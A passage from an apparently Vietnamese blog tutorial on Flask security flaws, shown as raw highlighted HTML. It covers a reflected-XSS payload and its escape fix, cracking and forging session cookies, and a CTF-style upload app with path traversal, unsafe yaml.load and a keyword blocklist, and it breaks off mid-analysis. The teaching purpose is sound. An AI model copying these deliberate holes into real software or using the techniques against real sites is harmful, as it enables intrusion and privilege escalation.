class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;xxxxxxx&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># Check if user is logged in</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        username = session[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;admin&#x27;</span>, <span class="literal">False</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Hello, admin &#x27;</span> + username</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Hello, &#x27;</span> + username</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You are not logged in&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="comment"># Login logic here</span></span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span> <span class="keyword">if</span> request.form.get(<span class="string">&#x27;admin&#x27;</span>) <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">               &lt;form method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&lt;input type=text name=username placeholder=&quot;Enter your name&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&lt;input type=checkbox name=admin&gt; Admin&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&lt;input type=submit value=Login&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">               &lt;/form&gt;</span></span><br><span class="line"><span class="string">               &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    <span class="comment"># Remove the username and admin from the session if it is there</span></span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;admin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>Demo một vài cái cơ bạn vậy thôi, bây giờ mình sẽ đi vào các hàm và lỗ hổng của nó. Bài viết chỉ nằm ở mức cơ bản, các bạn có thể tự tìm hiểu sâu vào nó nhé~</p><h2 id="Is-flask-web-safe"><a href="#Is-flask-web-safe" class="headerlink" title="Is flask web safe?"></a>Is flask web safe?</h2><h3 id="Ham-make-response"><a href="#Ham-make-response" class="headerlink" title="Hàm make_response"></a>Hàm make_response</h3><p>Một đoạn mã dẫn đến XSS cơ bản.<br><em>app.py</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    resp = make_response(<span class="string">&#x27;Hello, &#x27;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>Hàm make_response trên sẽ tạo một response gán vào biến resp, sau đó nó được trả về trực tiếp ở browser của người dùng. Ở đây không có thứ gì lọc đầu vào cả nên nếu chúng ta đưa vào một đoạn mã javascript, response sẽ được trả về browser và browser sẽ thực thi nó dẫn đến lỗi XSS.<br>Demo <code>http://127.0.0.1:5000/?name=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p><p>Để phòng tránh, chúng ta có thể sử dụng html.escape để lọc đầu vào.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"><span class="keyword">from</span> html <span class="keyword">import</span> escape</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = escape(request.args.get(<span class="string">&#x27;name&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    resp = make_response(<span class="string">&#x27;Hello, &#x27;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>Khi chúng ta đưa vào đoạn payload <code>http://127.0.0.1:5000/?name=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>, thì biến name sẽ có giá trị <code>&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;)&amp;lt;/script&amp;gt;</code>. Sau khi trả về cho browser, nó sẽ convert thành <code>&lt;script&gt;Ealert(&#39;xss&#39;)&lt;/script&gt;</code> dựa theo html và không đọc mã javascript.<br>Có thể tồn tại cách bypass hàm này nhưng mình chưa nghĩ ra ~</p><h3 id="Cracking-session-cookie"><a href="#Cracking-session-cookie" class="headerlink" title="Cracking session cookie"></a>Cracking session cookie</h3><p>Flask web mã hóa session dưới dạng JWT và mã hóa với secret_key. Nếu chúng ta có secret_key, chúng ta có thể giả mạo session cookie để thực hiện một vài thao tác như nâng quyền quản trị,…<br>Để thực hiện điều này chúng ta có thể dùng module flask_unsign của python.<br>Tham khảo:</p><ul><li><a href="https://www.youtube.com/watch?v=dA28abgc57o">https://www.youtube.com/watch?v=dA28abgc57o</a></li><li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask</a></li></ul><p>Demo cracking session cokkie.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;xxxxxxx&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># Check if user is logged in</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        username = session[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;admin&#x27;</span>, <span class="literal">False</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Hello, admin &#x27;</span> + username</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Hello, &#x27;</span> + username</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You are not logged in&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="comment"># Login logic here</span></span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span> <span class="keyword">if</span> request.form.get(<span class="string">&#x27;admin&#x27;</span>) <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">               &lt;form method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&lt;input type=text name=username placeholder=&quot;Enter your name&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&lt;input type=checkbox name=admin&gt; Admin&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&lt;input type=submit value=Login&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">               &lt;/form&gt;</span></span><br><span class="line"><span class="string">               &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    <span class="comment"># Remove the username and admin from the session if it is there</span></span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;admin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>Đầu tiên chúng ta cần thực hiện brute force sault dùng để mã hóa cookie.<br>ảnh cracking cookie<br>Sau khi có được sault, chúng ta sẽ thay đổi session cookie theo hướng chúng ta muốn.<br>ảnh sign cookie<br>ảnh change_cookie</p><h3 id="jsonify"><a href="#jsonify" class="headerlink" title="jsonify()"></a>jsonify()</h3><h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, make_response, send_file, request, redirect, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = socket.gethostname()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">response</span>(<span class="params">content, status</span>):</span><br><span class="line">    resp = make_response(content, status)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.path == <span class="string">&quot;/upload&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&quot;Administrator&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;&lt;script&gt;alert(&#x27;Access Denied&#x27;);window.location.href=&#x27;/&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;user&#x27;</span>):</span><br><span class="line">        session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;Guest&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> response(<span class="string">&quot;Not Found.&quot;</span>, <span class="number">404</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            updir = <span class="string">&#x27;static/uploads/&#x27;</span> + \</span><br><span class="line">                md5(request.remote_addr.encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;updir&#x27;</span>):</span><br><span class="line">                session[<span class="string">&#x27;updir&#x27;</span>] = updir</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(updir):</span><br><span class="line">                os.makedirs(updir)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> response(<span class="string">&#x27;Internal Server Error.&#x27;</span>, <span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:file&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;updir&#x27;</span>):</span><br><span class="line">        basedir = session.get(<span class="string">&#x27;updir&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            path = os.path.join(basedir, file).replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(path):</span><br><span class="line">                <span class="keyword">return</span> send_file(path)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> response(<span class="string">&quot;Not Found.&quot;</span>, <span class="number">404</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> response(<span class="string">&quot;Failed.&quot;</span>, <span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        uploadFile = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        filename = request.files[<span class="string">&#x27;file&#x27;</span>].filename</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">r&quot;\.\.|/&quot;</span>, filename, re.M | re.I) != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">        filepath = <span class="string">f&quot;<span class="subst">&#123;session.get(<span class="string">&#x27;updir&#x27;</span>)&#125;</span>/<span class="subst">&#123;md5(filename.encode()).hexdigest()&#125;</span>.rar&quot;</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;&lt;script&gt;alert(&#x27;The <span class="subst">&#123;filename&#125;</span> file has been uploaded&#x27;);window.location.href=&#x27;/display?file=<span class="subst">&#123;filename&#125;</span>&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            uploadFile.save(filepath)</span><br><span class="line"></span><br><span class="line">        extractdir = <span class="string">f&quot;<span class="subst">&#123;session.get(<span class="string">&#x27;updir&#x27;</span>)&#125;</span>/<span class="subst">&#123;filename.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(extractdir):</span><br><span class="line">            os.makedirs(extractdir)</span><br><span class="line"></span><br><span class="line">        pStatus = subprocess.Popen(</span><br><span class="line">            [<span class="string">&quot;/usr/bin/unrar&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;-o+&quot;</span>, filepath, extractdir])</span><br><span class="line">        t_beginning = time.time()</span><br><span class="line">        seconds_passed = <span class="number">0</span></span><br><span class="line">        timeout = <span class="number">60</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> pStatus.poll() <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            seconds_passed = time.time() - t_beginning</span><br><span class="line">            <span class="keyword">if</span> timeout <span class="keyword">and</span> seconds_passed &gt; timeout:</span><br><span class="line">                pStatus.terminate()</span><br><span class="line">                <span class="keyword">raise</span> TimeoutError(cmd, timeout)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">        rarDatas = &#123;<span class="string">&#x27;filename&#x27;</span>: filename, <span class="string">&#x27;dirs&#x27;</span>: [], <span class="string">&#x27;files&#x27;</span>: []&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> dirpath, dirnames, filenames <span class="keyword">in</span> os.walk(extractdir):</span><br><span class="line">            relative_dirpath = dirpath.split(extractdir)[-<span class="number">1</span>]</span><br><span class="line">            rarDatas[<span class="string">&#x27;dirs&#x27;</span>].append(relative_dirpath)</span><br><span class="line">            <span class="keyword">for</span> file <span class="keyword">in</span> filenames:</span><br><span class="line">                rarDatas[<span class="string">&#x27;files&#x27;</span>].append(os.path.join(</span><br><span class="line">                    relative_dirpath, file).split(<span class="string">&#x27;./&#x27;</span>)[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;fileinfo/<span class="subst">&#123;md5(filename.encode()).hexdigest()&#125;</span>.yaml&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(yaml.dump(rarDatas))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">f&#x27;/display?file=<span class="subst">&#123;filename&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/display&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">display</span>():</span><br><span class="line"></span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">        <span class="keyword">return</span> response(<span class="string">&quot;Not Found.&quot;</span>, <span class="number">404</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">f&#x27;fileinfo/<span class="subst">&#123;md5(filename.encode()).hexdigest()&#125;</span>.yaml&#x27;</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;fileinfo/<span class="subst">&#123;md5(filename.encode()).hexdigest()&#125;</span>.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            yamlDatas = f.read()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> re.search(<span class="string">r&quot;apply|process|out|system|exec|tuple|flag|\(|\)|\&#123;|\&#125;&quot;</span>, yamlDatas, re.M | re.I):</span><br><span class="line">                rarDatas = yaml.load(yamlDatas.strip().strip(<span class="string">b&#x27;\x00&#x27;</span>.decode()))</span><br><span class="line">                <span class="keyword">if</span> rarDatas:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;result.html&#x27;</span>, filename=filename, path=filename.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>], files=rarDatas[<span class="string">&#x27;files&#x27;</span>])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> response(<span class="string">&#x27;Internal Server Error.&#x27;</span>, <span class="number">500</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> response(<span class="string">&#x27;Forbidden.&#x27;</span>, <span class="number">403</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> response(<span class="string">&quot;Not Found.&quot;</span>, <span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h4 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="Phân tích"></a>Phân tích</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:file&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;updir&#x27;</span>):</span><br><span class="line">        basedir = session.get(<span class="string">&#x27;updir&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            path = os.path.join(basedir, file).replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> 